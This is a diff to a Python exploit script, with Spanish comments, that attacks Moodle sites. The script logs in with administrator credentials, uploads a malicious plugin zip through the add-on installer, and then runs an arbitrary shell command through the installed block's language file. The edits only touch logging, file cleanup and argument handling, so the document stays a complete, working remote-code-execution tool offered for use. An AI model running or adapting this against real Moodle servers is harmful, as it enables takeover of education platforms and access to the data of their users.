@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 
-import logging
 import random
 import string
 import os
@@ -65,7 +64,6 @@ def crearZip(cadena):
 
 
 def conexionMoodle(url,usuario,password):
-	#p1 = logging.progress("[+] Iniciando sesión")
 	login_url = url + "/login/index.php"
 	session = requests.Session()
 	r = session.get(login_url)
@@ -80,11 +78,11 @@ def conexionMoodle(url,usuario,password):
 # Iniciar sesión en Moodle
 
 	response = session.post(login_url, data=data)
-	#p1.status("Creds " + Color.BLUE + usuario + ":" + password + Color.END)
+
 	time.sleep(2)
 # Verificar si se ha iniciado sesión correctamente
 	if "logout" in response.text:
-		#p1.success(Color.BLUE + usuario + ":" + password + Color.END + Color.YELLOW + " ✓" + Color.END)
+
 		time.sleep(1)
 		print(Color.YELLOW + "[+] Inicio de sesión exitoso" + Color.END)
 	else:
@@ -98,9 +96,6 @@ def RCE(url,sess,cadena,command):
 	r = sess.get(url + '/admin/tool/installaddon/index.php')
 	if r.status_code == 200:
 	
-	#itemid =re.findall(r'itemid=(\d*)', r.text)[0]
-	#file=open(cadena + ".zip", "rb")
-	#file.read()
 		new_sess_key=re.findall(r'"sesskey":"(.*?)"', r.text)[0]
 	
 		itemid = re.findall(r'name="zipfile" id="id_zipfile" value="(.*?)"', r.text)[0]
@@ -126,16 +121,16 @@ def RCE(url,sess,cadena,command):
 	"accepted_types[]": [".zip",".zip"],
 	}
 # Subir el plugin
-	#p2 = logging.progress("[+] Subiendo zip")
+
 	url_upload =url+"/repository/repository_ajax.php"
 	response = sess.post(url_upload, params=data_get, data=files, files=data_file)
 	
 	if response.status_code == 200:
-		#p2.success(Color.BLUE + "[+] Se ha subido el zip correctamente"+ Color.END + Color.YELLOW + " ✓" + Color.END)
+
 		print(Color.YELLOW + "[+] Se ha subido el zip correctamente" + Color.END)
     # install zip file
 	new_url=url+"/admin/tool/installaddon/index.php"
-	#p2 = logging.progress("[+] Subiendo zip")
+
 	data={
 		"sesskey" : (None,new_sess_key),
         	"_qf__tool_installaddon_installfromzip_form" : (None,"1"),
@@ -171,7 +166,7 @@ def RCE(url,sess,cadena,command):
 	response=sess.get(url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php", params=data_get2)
 	print("\n")
 	print(Color.GREEN + response.text + Color.END)
-	os.system("rm " + cadena + ".zip")
+	os.remove(cadena + ".zip")
 
 	
 if __name__ == '__main__':
@@ -208,32 +203,33 @@ if __name__ == '__main__':
     
     
     		[1] python3 suyScript.py -url http://test.local:8080 -u usuario -p password -cmd id
-
     """ + Color.END)
+	try:
+		ap = argparse.ArgumentParser()
+		ap.add_argument("-url", "--url", required=False)
+		ap.add_argument("-u", "--username",  required=False,)
+		ap.add_argument("-p", "--password",  required=False)
+		ap.add_argument("-cmd", "--command", required=False)
 
-	ap = argparse.ArgumentParser()
+		args = vars(ap.parse_args())
 		# Add the arguments to the parser
-	ap.add_argument("-url", "--url", required=True,
-										help=" URL for your Moodle target")
-	ap.add_argument("-u", "--username",
-										help="username")
-	ap.add_argument("-p", "--password",
-										help="password")
-	ap.add_argument("-cmd", "--command", default="whoami",
-										help="command")
-	args = vars(ap.parse_args())
-	url = format(str(args['url']))
-	print (Color.YELLOW + '[+] Your target: ' + url + Color.END)
-		# username
-	uname = format(str(args['username']))
-		# password
-	upass = format(str(args['password']))
-		# command
-	command = format(str(args['command']))
+		if(args['url'] == None or args['username'] == None or args['password'] == None or args['command'] == None):
+			sys.exit(1)
 
-	cadena=random_string()
-	direct=crearDirectorios(cadena)
-	crearZip(direct)
-	sess=conexionMoodle(url,uname,upass)
-	RCE(url,sess,cadena,command)
-	sys.exit(1)
+		url = format(str(args['url']))
+		print (Color.YELLOW + '[+] Your target: ' + url + Color.END)
+			# username
+		uname = format(str(args['username']))
+			# password
+		upass = format(str(args['password']))
+			# command
+		command = format(str(args['command']))
+
+		cadena=random_string()
+		direct=crearDirectorios(cadena)
+		crearZip(direct)
+		sess=conexionMoodle(url,uname,upass)
+		RCE(url,sess,cadena,command)
+		sys.exit(1)
+	except:
+		sys.exit(1)
